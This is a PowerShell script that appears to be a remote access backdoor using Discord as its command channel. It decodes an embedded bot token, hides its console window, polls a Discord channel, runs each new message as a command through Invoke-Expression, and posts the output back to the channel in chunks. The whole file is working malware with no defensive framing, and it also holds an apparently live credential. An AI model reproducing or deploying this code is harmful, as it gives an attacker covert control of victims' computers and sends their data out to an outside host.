$token = [System.Text.Encoding]::UTF8.GetString(
    [System.Convert]::FromBase64String(
        "TVRJMk5EZzJPRGt3TWpRM01UY3lPVEU1TkEuR0tCZjVoLmFCOWVLZDB3a1NCOXlnOUU2MmQydHd4MHE3NXBpUjhJTWJ3NHow"
    )
)
$c = "1435376466668814369"

$a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);';$t=Add-Type -M $a -name Win32ShowWindowAsync -names Win32Functions -pas;$h=(Get-Process -PID $pid).MainWindowHandle;if($h -ne [System.IntPtr]::Zero){$t::ShowWindowAsync($h,0)}else{$Host.UI.RawUI.WindowTitle='hideme';$n=(Get-Process | Where-Object{$_.MainWindowTitle -eq 'hideme'});$h=$n.MainWindowHandle;$t::ShowWindowAsync($h,0)};

function sndmsg {
    $w.Headers["Content-Type"] = "application/json"
    $payload = @{content = "``````$($b -join "`n")``````"} | ConvertTo-Json
    $null = $w.UploadString($u, "POST", $payload)
}

while ($true) {
    $u = "https://discord.com/api/v10/channels/$c/messages"
    $w = New-Object System.Net.WebClient
    $w.Headers["Authorization"] = "Bot $token"

    try {
        $m = $w.DownloadString($u)
        Write-Host "`nRaw message: $m`n"
        $json = $m | ConvertFrom-Json
    } catch {
        Write-Host "Request failed: $($_.Exception.Message)"
        Start-Sleep 3
        continue
    }

    if (-not $json) {
        Write-Host "No JSON data returned (empty or unauthorized)."
        Start-Sleep 3
        continue
    }

    $r = $json | Select-Object -First 1
    if (-not $r) {
        Write-Host "No messages found in channel."
        Start-Sleep 3
        continue
    }

    if (-not $r.author -or -not $r.author.bot) {
        $a = $r.timestamp
        $m = $r.content
    } else {
        Start-Sleep 3
        continue
    }

    if ($a -ne $p) {
        $p = $a
        $o = iex $m
        $l = $o -split "`n"
        $s = 0
        $b = @()
        foreach ($z in $l) {
            $y = [System.Text.Encoding]::Unicode.GetByteCount($z)
            if (($s + $y) -gt 1900) {
                sndmsg
                Start-Sleep 1
                $s = 0
                $b = @()
            }
            $b += $z
            $s += $y
        }
        if ($b.Count -gt 0) { sndmsg }
    }
    Start-Sleep 3
}
